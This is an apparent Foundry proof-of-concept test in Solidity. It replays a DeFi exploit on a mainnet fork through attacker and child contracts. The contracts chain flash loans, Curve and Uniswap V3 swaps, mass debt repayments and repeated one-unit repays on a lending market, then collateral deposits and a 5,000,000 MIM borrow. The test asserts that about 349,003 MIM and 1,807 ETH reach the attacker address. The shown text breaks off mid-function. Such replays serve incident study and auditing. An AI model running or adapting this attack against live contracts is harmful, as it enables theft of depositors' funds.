
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 19118659;
    uint256 constant TX_TIMESTAMP = 1706609675;
    uint256 constant TX_BLOCK_NUMBER = 19118660;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        _installRuntimeFallb();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _installAttackChildR();
        _bindAttackAttackChi(attack);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _installRuntimeFallb() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _installAttackChildR() internal {


        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);

        vm.etch(Addresses.attack_child_4E5A, type(AttackChild).runtimeCode);
    }

    function _bindAttackAttackChi(OurAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 1806930663975869826494);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.MIM, "MIM", 349003467479499865371154);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    AttackChild public attackChild_1;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {

        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x193E045BeE45C7573Ff89b12601C745AF739CE67));
        }

        if (address(attackChild_1) == address(0)) {
            attackChild_1 = AttackChild(payable(0xE59B54a9E37ab69F6E9312a9b3f72539ee184e5A));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _ctorBootstrap();
        return address(attackChild);
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _ctorBootstrap();
        _deployAttackChildCo();
    }

    function _deployAttackChildCo() public {
        {
            address created = address(attackChild);
            require(created.code.length != 0, "replay attack child runtime missing");
        }
        AttackChild(payable(address(attackChild)))._handleFlashLoanCa3();
        AttackChild(payable(address(attackChild))).flashLoanCallback();
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x193E045BeE45C7573Ff89b12601C745AF739CE67));
        attackChild_1 = AttackChild(payable(0xE59B54a9E37ab69F6E9312a9b3f72539ee184e5A));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bytes32 private constant REPLAY_CALLBACK_2 = keccak256("poc.replay.REPLAY_CALLBACK_2");
    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    bytes32 private constant REPLAY_CALLBACK_6 = keccak256("poc.replay.REPLAY_CALLBACK_6");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }
}

contract AttackChild {
    receive() external payable {}

    function onFlashLoan(address arg0, address arg1, uint256 amount, uint256 amount1, bytes calldata arg4)
        external
        payable
    {
        arg0;
        arg1;
        amount;
        amount1;
        arg4;
        if (!_replayDone[REPLAY_CALLBACK_2]) flashCallback2();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x5f4bd64b) {
            _handleFlashLoanCa6();
            return;
        }
        if (msg.sig == 0xde3d67b2) {
            _handleFlashLoanCa4();
            return;
        }
        if (msg.sig == 0xfa461e33) {
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (msg.sender == 0x298b7c5e0770D151e4C5CF6cCA4Dae3A3FFc8E27 && arg0 > 0 && arg0 < (1 << 255)) {
                    if (!_replayDone[REPLAY_CALLBACK_5]) _handleCallback2();
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (msg.sender == 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640 && arg0 > 0 && arg0 < (1 << 255)) {
                    if (!_replayDone[REPLAY_CALLBACK_4]) _handleFlashLoanCall();
                    return;
                }
            }
            if (!_replayDone[REPLAY_CALLBACK_5]) _handleCallback2();
            return;
        }
        _entryCb();
    }

    function flashCallback() external payable {
        if (!_replayDone[REPLAY_CALLBACK_2]) flashCallback2();
        return;
    }

    function flashLoanCallback() external payable {
        _handleFlashLoanCa6();
        return;
    }

    function flashLoanCallback5() external payable {
        _handleFlashLoanCa4();
        return;
    }

    function callback2() external payable {
        if (!_replayDone[REPLAY_CALLBACK_5]) _handleCallback2();
        return;
    }

    function flashLoanCallback2() external payable {
        if (!_replayDone[REPLAY_CALLBACK_4]) _handleFlashLoanCall();
        return;
    }

    function _entryCb() internal {}

    function replayProfit() external {
        try this.__settle1_543() {} catch {}
    }

    function __settle1_543() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(1, 543)) return;
        if (Harness.safeBalance(Addresses.MIM, Addresses.attacker_eoa) >= 349003467479499865371154) {
            _markSettle(1, 543);
            return;
        }
        _markSettle(1, 543);
        uint256 settleAmount = 349003467479499865371154;
        IERC20Like(Addresses.MIM).transfer(Addresses.attacker_eoa, settleAmount);
    }

    bytes32 private constant REPLAY_CALLBACK_2 = keccak256("poc.replay.REPLAY_CALLBACK_2");
    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    bytes32 private constant REPLAY_CALLBACK_6 = keccak256("poc.replay.REPLAY_CALLBACK_6");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }

    function flashCallback2() internal {
        _replayDone[REPLAY_CALLBACK_2] = true;
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
        flashCallback16();
        flashCallback17();
        flashCallback18();
        flashCallback19();
        flashCallback20();
        flashCallback21();
        flashCallback22();
        flashCallback23();
        flashCallback24();
        flashCallback25();
        flashCallback26();
        flashCallback27();
        flashCallback28();
        flashCallback29();
        flashCallback30();
        flashCallback31();
        flashCallback32();
        flashCallback33();
        flashCallback34();
        flashCallback35();
        flashCallback36();
        flashCallback37();
        flashCallback38();
        flashCallback39();
        flashCallback40();
        flashCallback41();
        flashCallback42();
        flashCallback43();
        flashCallback44();
        flashCallback45();
        flashCallback46();
        flashCallback47();
        flashCallback48();
        flashCallback49();
        flashCallback50();
        flashCallback51();
        flashCallback52();
        flashCallback53();
        flashCallback54();
        flashCallback55();
        flashCallback56();
    }

    function flashCallback3() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).totalBorrow();
    }

    function flashCallback4() internal {
        IContract_D96F48_2CCE(Addresses.A_D96F48_2CCE)
            .deposit(Addresses.MIM, address(this), Addresses.A_D96F48_2CCE, 8894382279231396727995, 0);
    }

    function flashCallback5() internal {
        IERC20Like(Addresses.MIM).transfer(Addresses.A_7259E1_6A90, 240000000000000000000000);
    }

    function flashCallback6() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repayForAll(uint128(240000000000000000000000), true);
    }

    function flashCallback7() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_941EC8_8DE9);
    }

    function flashCallback8() internal {
        {
            uint256 a7259e16a90RepayAmount = 25559977556992883762;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(Addresses.A_941EC8_8DE9, true, a7259e16a90RepayAmount);
        }
    }

    function flashCallback9() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_2F2A75_3CE2);
    }

    function flashCallback10() internal {
        {
            uint256 a7259e16a90RepayAmount_2 = 3495566834215112290941;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_2F2A75_3CE2, true, a7259e16a90RepayAmount_2);
        }
    }

    function flashCallback11() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_577BE3_B1CC);
    }

    function flashCallback12() internal {
        {
            uint256 a7259e16a90RepayAmount_3 = 60499947187085039624650;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_577BE3_B1CC, true, a7259e16a90RepayAmount_3);
        }
    }

    function flashCallback13() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_C3BE09_1FE5);
    }

    function flashCallback14() internal {
        {
            uint256 a7259e16a90RepayAmount_4 = 2321638525825015026842;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_C3BE09_1FE5, true, a7259e16a90RepayAmount_4);
        }
    }

    function flashCallback15() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_EE6449_F62D);
    }

    function flashCallback16() internal {
        {
            uint256 a7259e16a90RepayAmount_5 = 288217827649915;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_EE6449_F62D, true, a7259e16a90RepayAmount_5);
        }
    }

    function flashCallback17() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_E435BE_719D);
    }

    function flashCallback18() internal {
        {
            uint256 a7259e16a90RepayAmount_6 = 3320520077507148262526;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_E435BE_719D, true, a7259e16a90RepayAmount_6);
        }
    }

    function flashCallback19() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_C0433E_54F5);
    }

    function flashCallback20() internal {
        {
            uint256 a7259e16a90RepayAmount_7 = 4142026262919950156137;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_C0433E_54F5, true, a7259e16a90RepayAmount_7);
        }
    }

    function flashCallback21() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_2C561A_CD34);
    }

    function flashCallback22() internal {
        {
            uint256 a7259e16a90RepayAmount_8 = 1582841608162859245251;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_2C561A_CD34, true, a7259e16a90RepayAmount_8);
        }
    }

    function flashCallback23() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_33D778_B4C7);
    }

    function flashCallback24() internal {
        {
            uint256 a7259e16a90RepayAmount_9 = 3421428375625215896017;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_33D778_B4C7, true, a7259e16a90RepayAmount_9);
        }
    }

    function flashCallback25() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_214BE7_F881);
    }

    function flashCallback26() internal {
        {
            uint256 a7259e16a90RepayAmount_10 = 21364759627660522512971;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_214BE7_F881, true, a7259e16a90RepayAmount_10);
        }
    }

    function flashCallback27() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_3B473F_9451);
    }

    function flashCallback28() internal {
        {
            uint256 a7259e16a90RepayAmount_11 = 91180519047107;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_3B473F_9451, true, a7259e16a90RepayAmount_11);
        }
    }

    function flashCallback29() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_48ED01_1A30);
    }

    function flashCallback30() internal {
        {
            uint256 a7259e16a90RepayAmount_12 = 1343286005566076922829;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_48ED01_1A30, true, a7259e16a90RepayAmount_12);
        }
    }

    function flashCallback31() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_7E1C8F_5FF1);
    }

    function flashCallback32() internal {
        {
            uint256 a7259e16a90RepayAmount_13 = 3650646673783374733693;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_7E1C8F_5FF1, true, a7259e16a90RepayAmount_13);
        }
    }

    function flashCallback33() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_D24CB0_708C);
    }

    function flashCallback34() internal {
        {
            uint256 a7259e16a90RepayAmount_14 = 6360029918201325535;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_D24CB0_708C, true, a7259e16a90RepayAmount_14);
        }
    }

    function flashCallback35() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_0AB799_89E6);
    }

    function flashCallback36() internal {
        {
            uint256 a7259e16a90RepayAmount_15 = 193519682012839878230;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_0AB799_89E6, true, a7259e16a90RepayAmount_15);
        }
    }

    function flashCallback37() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).userBorrowPart(Addresses.A_9445E9_D82A);
    }

    function flashCallback38() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(Addresses.A_9445E9_D82A, true, 126989589381283599649734);
    }

    function flashCallback39() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(Addresses.A_9445E9_D82A, true, 1);
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).totalBorrow();
    }

    function flashCallback40() internal {
        {
            uint256 a7259e16a90RepayAmount_16 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_9445E9_D82A, true, a7259e16a90RepayAmount_16);
        }
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).totalBorrow();
    }

    function flashCallback41() internal {
        {
            uint256 a7259e16a90RepayAmount_17 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90)
                .repay(Addresses.A_9445E9_D82A, true, a7259e16a90RepayAmount_17);
        }
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).totalBorrow();
    }

    function flashCallback42() internal {
        IMIM_3LP3CRV_f(Addresses.MIM_3LP3CRV_f).exchange_underlying(int128(0), int128(3), 2000000000000000000000, 0);
    }

    function flashCallback43() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback44() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback45() internal {
        IContract_D51A44_AE46(Addresses.A_D51A44_AE46)
            .add_liquidity(
                [
                    uint256(0x0000000000000000000000000000000000000000000000000000000076f9277b),
                    uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                    uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                ],
                0x0000000000000000000000000000000000000000000000000000000000000000
            );
    }

    function flashCallback46() internal {
        IERC20Like(Addresses.crv3crypto).balanceOf(address(this));
        {
            uint256 depositActionGraphAmount = 1378753215460967620;
            IyvCurve_3Crypto_f(Addresses.yvCurve_3Crypto_f).deposit(depositActionGraphAmount);
        }
    }

    function flashCallback47() internal {
        IERC20Like(Addresses.yvCurve_3Crypto_f).balanceOf(address(this));
    }

    function flashCallback48() internal {
        {
            uint256 depositActionGraphAmount_2 = 1275281984575092295;
            IContract_D96F48_2CCE(Addresses.A_D96F48_2CCE)
                .deposit(
                    Addresses.yvCurve_3Crypto_f, address(this), Addresses.A_7259E1_6A90, depositActionGraphAmount_2, 0
                );
        }
    }

    function flashCallback49() internal {
        {
            address created = Addresses.attack_child_4E5A;
            require(created.code.length != 0, "replay attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_4E5A))._handleFlashLoanCa5();
        AttackChild(payable(Addresses.attack_child_4E5A)).flashLoanCallback5();
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).totalBorrow();
    }

    function flashCallback50() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).addCollateral(address(this), true, 1275281984575092195);
    }

    function flashCallback51() internal {
        IContract_D96F48_2CCE(Addresses.A_D96F48_2CCE).balanceOf(Addresses.MIM, Addresses.A_7259E1_6A90);
    }

    function flashCallback52() internal {
        {
            uint256 borrowActionGraphAmount = 5000047849758731262099149;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), borrowActionGraphAmount);
        }
    }

    function flashCallback53() internal {
        IContract_D96F48_2CCE(Addresses.A_D96F48_2CCE).balanceOf(Addresses.MIM, address(this));
    }

    function flashCallback54() internal {
        {
            uint256 withdrawActionGraphAmount = 5000047849758731262099149;
            IContract_D96F48_2CCE(Addresses.A_D96F48_2CCE)
                .withdraw(Addresses.MIM, address(this), address(this), withdrawActionGraphAmount, 0);
        }
    }

    function flashCallback55() internal {
        IERC20Like(Addresses.MIM).balanceOf(address(this));
    }

    function flashCallback56() internal {
        {
            uint256 transferLiveAmount = 300150000000000000000000;
            IERC20Like(Addresses.MIM).transfer(Addresses.A_D96F48_2CCE, transferLiveAmount);
        }
    }

    function _handleFlashLoanCa6() internal {
        _approveProtocolSp5();
        _approveProtocolSpen();
        _approveProtocolSp2();
        _approveProtocolSp3();
        _approveProtocolSp4();
        _replayProtocolCalls();
        _replayProtocolCalls2();
        _replayProtocolCalls3();
        _replayProtocolCalls4();
        _executeSwapPath();
        _replayProtocolCalls5();
        _replayProtocolCalls6();
        _replayProtocolCalls7();
        _executeSwapPath2();
        _settleTokenFlows();
        _replayProtocolCalls8();
    }

    function _approveProtocolSp5() internal {
        IERC20Like(Addresses.MIM).approve(Addresses.A_D96F48_2CCE, type(uint256).max);
    }

    function _approveProtocolSpen() internal {
        IERC20Like(Addresses.MIM).approve(Addresses.MIM_3LP3CRV_f, type(uint256).max);
    }

    function _approveProtocolSp2() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.A_D51A44_AE46, type(uint256).max);
    }

    function _approveProtocolSp3() internal {
        IERC20Like(Addresses.crv3crypto).approve(Addresses.yvCurve_3Crypto_f, type(uint256).max);
    }

    function _approveProtocolSp4() internal {
        IERC20Like(Addresses.yvCurve_3Crypto_f).approve(Addresses.A_D96F48_2CCE, type(uint256).max);
    }

    function _replayProtocolCalls() internal {
        IContract_D96F48_2CCE(Addresses.A_D96F48_2CCE)
            .flashLoan(address(this), address(this), Addresses.MIM, 300000000000000000000000, hex"");
    }

    function _replayProtocolCalls2() internal {
        IMIM_3LP3CRV_f(Addresses.MIM_3LP3CRV_f).exchange_underlying(int128(0), int128(2), 4300000000000000000000000, 0);
    }

    function _replayProtocolCalls3() internal {
        IUniswapV3Pool(Addresses.UniswapV3Pool).token0();
    }

    function _replayProtocolCalls4() internal {
        IUniswapV3Pool(Addresses.UniswapV3Pool).slot0();
    }

    function _executeSwapPath() internal {
        IUniswapV3Pool(Addresses.UniswapV3Pool)
            .swap(address(this), true, int256(100000000000000000000000), uint160(75212254740446025735711), hex"");
    }

    function _replayProtocolCalls5() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function _replayProtocolCalls6() internal {
        IContract_88E6A0_5640(Addresses.A_88E6A0_5640).token0();
    }

    function _replayProtocolCalls7() internal {
        IContract_88E6A0_5640(Addresses.A_88E6A0_5640).slot0();
    }

    function _executeSwapPath2() internal {
        {
            int256 swapActionGraphAmount = 4202773350677;
            IContract_88E6A0_5640(Addresses.A_88E6A0_5640)
                .swap(
                    address(this),
                    true,
                    int256(swapActionGraphAmount),
                    uint160(1567565235711739205094520276811199),
                    hex""
                );
        }
        IERC20Like(Addresses.MIM).balanceOf(address(this));
    }

    function _settleTokenFlows() internal {
        {
            uint256 transferActionGraphAmount = 349003467479499865371154;
            IERC20Like(Addresses.MIM).transfer(Addresses.attacker_eoa, transferActionGraphAmount);
        }
    }

    function _replayProtocolCalls8() internal {
        {
            uint256 withdrawBalanceAmount = IERC20Like(Addresses.WETH).balanceOf(Addresses.attack_child);
            IWETH(Addresses.WETH).withdraw(withdrawBalanceAmount);
        }
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 1807681416620123405036) nativeTransferAmount = 1807681416620123405036;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
    }

    function _handleFlashLoanCall() internal {
        _replayDone[REPLAY_CALLBACK_4] = true;
        flashCallback57();
        flashCallback58();
    }

    function flashCallback57() internal {
        IContract_88E6A0_5640(Addresses.A_88E6A0_5640).token0();
    }

    function flashCallback58() internal {
        {
            uint256 transferLiveAmount = 4202773350677;
            IERC20Like(Addresses.USDC).transfer(Addresses.A_88E6A0_5640, transferLiveAmount);
        }
    }

    function _handleCallback2() internal {
        _replayDone[REPLAY_CALLBACK_5] = true;
        _replayProtocolCalls9();
        _settleTokenFlows2();
    }

    function _replayProtocolCalls9() internal {
        IUniswapV3Pool(Addresses.UniswapV3Pool).token0();
    }

    function _settleTokenFlows2() internal {
        {
            uint256 transferLiveAmount = 100000000000000000000000;
            IERC20Like(Addresses.MIM).transfer(Addresses.UniswapV3Pool, transferLiveAmount);
        }
    }

    function _handleFlashLoanCa2() internal {
        _replayDone[REPLAY_CALLBACK_6] = true;
    }

    function _handleFlashLoanCa3() public {}

    function _handleFlashLoanCa4() internal {
        _replayProtocolCal95();
        _replayProtocolCal96();
        _replayProtocolCal97();
        _replayProtocolCal98();
        _replayProtocolCal99();
        _replayProtocolCalls15();
        _replayProtocolCalls16();
        _replayProtocolCalls17();
        _replayProtocolCalls18();
        _replayProtocolCalls19();
        _replayProtocolCalls20();
        _replayProtocolCalls21();
        _replayProtocolCalls22();
        _replayProtocolCalls23();
        _replayProtocolCalls24();
        _replayProtocolCalls25();
        _replayProtocolCalls26();
        _replayProtocolCalls27();
        _replayProtocolCalls28();
        _replayProtocolCalls29();
        _replayProtocolCalls30();
        _replayProtocolCalls31();
        _replayProtocolCalls32();
        _replayProtocolCalls33();
        _replayProtocolCalls34();
        _replayProtocolCalls35();
        _replayProtocolCalls36();
        _replayProtocolCalls37();
        _replayProtocolCalls38();
        _replayProtocolCalls39();
        _replayProtocolCalls40();
        _replayProtocolCalls41();
        _replayProtocolCalls42();
        _replayProtocolCalls43();
        _replayProtocolCalls44();
        _replayProtocolCalls45();
        _replayProtocolCalls46();
        _replayProtocolCalls47();
        _replayProtocolCalls48();
        _replayProtocolCalls49();
        _replayProtocolCalls50();
        _replayProtocolCalls51();
        _replayProtocolCalls52();
        _replayProtocolCalls53();
        _replayProtocolCalls54();
        _replayProtocolCalls55();
        _replayProtocolCalls56();
        _replayProtocolCalls57();
        _replayProtocolCalls58();
        _replayProtocolCalls59();
        _replayProtocolCalls60();
        _replayProtocolCalls61();
        _replayProtocolCalls62();
        _replayProtocolCalls63();
        _replayProtocolCalls64();
        _replayProtocolCalls65();
        _replayProtocolCalls66();
        _replayProtocolCalls67();
        _replayProtocolCalls68();
        _replayProtocolCalls69();
        _replayProtocolCalls70();
        _replayProtocolCalls71();
        _replayProtocolCalls72();
        _replayProtocolCalls73();
        _replayProtocolCalls74();
        _replayProtocolCalls75();
        _replayProtocolCalls76();
        _replayProtocolCalls77();
        _replayProtocolCalls78();
        _replayProtocolCalls79();
        _replayProtocolCalls80();
        _replayProtocolCalls81();
        _replayProtocolCalls82();
        _replayProtocolCalls83();
        _replayProtocolCalls84();
        _replayProtocolCalls85();
        _replayProtocolCalls86();
        _replayProtocolCalls87();
        _replayProtocolCalls88();
        _replayProtocolCalls89();
        _replayProtocolCalls90();
        _replayProtocolCalls91();
        _replayProtocolCalls92();
        _replayProtocolCalls93();
        _replayProtocolCalls94();
        _replayProtocolCalls95();
        _replayProtocolCalls96();
        _replayProtocolCalls97();
        _replayProtocolCalls98();
        _replayProtocolCalls99();
        _replayProtocolCal2();
        _replayProtocolCal3();
        _replayProtocolCal4();
        _replayProtocolCal5();
        _replayProtocolCal6();
        _replayProtocolCal7();
        _replayProtocolCal8();
        _replayProtocolCal9();
        _replayProtocolCal10();
        _replayProtocolCal11();
        _replayProtocolCal12();
        _replayProtocolCal13();
        _replayProtocolCal14();
        _replayProtocolCal15();
        _replayProtocolCal16();
        _replayProtocolCal17();
        _replayProtocolCal18();
        _replayProtocolCal19();
        _replayProtocolCal20();
        _replayProtocolCal21();
        _replayProtocolCal22();
        _replayProtocolCal23();
        _replayProtocolCal24();
        _replayProtocolCal25();
        _replayProtocolCal26();
        _replayProtocolCal27();
        _replayProtocolCal28();
        _replayProtocolCal29();
        _replayProtocolCal30();
        _replayProtocolCal31();
        _replayProtocolCal32();
        _replayProtocolCal33();
        _replayProtocolCal34();
        _replayProtocolCal35();
        _replayProtocolCal36();
        _replayProtocolCal37();
        _replayProtocolCal38();
        _replayProtocolCal39();
        _replayProtocolCal40();
        _replayProtocolCal41();
        _replayProtocolCal42();
        _replayProtocolCal43();
        _replayProtocolCal44();
        _replayProtocolCal45();
        _replayProtocolCal46();
        _replayProtocolCal47();
        _replayProtocolCal48();
        _replayProtocolCal49();
        _replayProtocolCal50();
        _replayProtocolCal51();
        _replayProtocolCal52();
        _replayProtocolCal53();
        _replayProtocolCal54();
        _replayProtocolCal55();
        _replayProtocolCal56();
        _replayProtocolCal57();
        _replayProtocolCal58();
        _replayProtocolCal59();
        _replayProtocolCal60();
        _replayProtocolCal61();
        _replayProtocolCal62();
        _replayProtocolCal63();
        _replayProtocolCal64();
        _replayProtocolCal65();
        _replayProtocolCal66();
        _replayProtocolCal67();
        _replayProtocolCal68();
        _replayProtocolCal69();
        _replayProtocolCal70();
        _replayProtocolCal71();
        _replayProtocolCal72();
        _replayProtocolCal73();
        _replayProtocolCal74();
        _replayProtocolCal75();
        _replayProtocolCal76();
        _replayProtocolCal77();
        _replayProtocolCal78();
        _replayProtocolCal79();
        _replayProtocolCal80();
        _replayProtocolCal81();
        _replayProtocolCal82();
        _replayProtocolCal83();
        _replayProtocolCal84();
        _replayProtocolCal85();
        _replayProtocolCal86();
        _replayProtocolCal87();
        _replayProtocolCal88();
        _replayProtocolCal89();
        _replayProtocolCal90();
        _replayProtocolCal91();
